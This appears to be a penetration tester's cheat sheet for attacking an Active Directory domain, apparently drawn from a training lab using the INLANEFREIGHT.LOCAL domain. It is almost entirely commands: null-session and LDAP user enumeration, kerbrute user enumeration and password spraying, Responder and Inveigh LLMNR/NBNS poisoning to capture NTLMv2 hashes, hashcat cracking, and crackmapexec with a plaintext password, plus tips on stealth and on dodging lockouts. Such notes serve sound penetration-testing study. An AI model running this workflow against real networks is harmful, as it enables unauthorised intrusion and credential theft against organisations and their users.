# Active Directory Enumeration

Goal: Identify domain users, policies, attack surface,
and credential validation opportunities.

---

# Basic Domain Queries

nslookup ns1.inlanefreight.com

rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo

rpcclient $> enumdomuser

---

# LDAP Enumeration

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*"

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

---

# Kerberos Enumeration

sudo git clone https://github.com/ropnop/kerbrute.git

make help

sudo make all

./kerbrute_linux_amd64

sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

---

# Windapsearch

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

---

# LLMNR / NBNS Poisoning

sudo responder -I ens224 -A

responder -h

Import-Module .\Inveigh.ps1

(Get-Command Invoke-Inveigh).Parameters

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

.\Inveigh.exe

---

# Hash Cracking

hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt

---

# Domain Policy Enumeration

crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

net accounts

Get-DomainPolicy

---

# Tactical Notes

- Enumerate users before spraying.
- Respect lockout thresholds.
- Kerbrute is stealthier than SMB brute.
- LLMNR poisoning only works if enabled.
- Crack captured NTLMv2 hashes immediately.
